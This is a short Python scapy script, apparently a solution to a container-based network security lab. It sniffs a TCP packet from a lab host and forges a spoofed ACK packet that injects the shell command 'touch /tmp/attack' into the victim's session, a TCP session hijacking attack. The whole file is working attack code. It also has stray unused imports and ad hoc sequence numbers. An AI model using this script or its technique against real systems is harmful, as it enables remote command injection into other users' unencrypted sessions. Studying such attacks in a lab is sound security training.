#!/usr/bin/env python3
from curses.panel import new_panel
from fcntl import FASYNC
from time import sleep
from scapy.all import *

def spoof_pkt(pkt):
    new_pkt = IP()/TCP()

    new_pkt[IP].src = pkt[IP].src
    new_pkt[IP].dst = pkt[IP].dst

    new_pkt[TCP].sport = pkt[TCP].sport
    new_pkt[TCP].dport = pkt[TCP].dport

    new_pkt[TCP].flags = "A"

    new_pkt[TCP].ack = pkt[TCP].ack+1
    new_pkt[TCP].seq = pkt[TCP].seq+10

    data = b'\ntouch /tmp/attack \n'
    
    send(new_pkt/data, verbose=0)
    
    ls(new_pkt/data)


if __name__ == '__main__':

    pkt = sniff(iface='br-8bdd88cc20ec', filter='tcp and ip src 10.9.0.6 and not ether src 02:42:bb:0f:b4:88', prn=spoof_pkt, count=1)
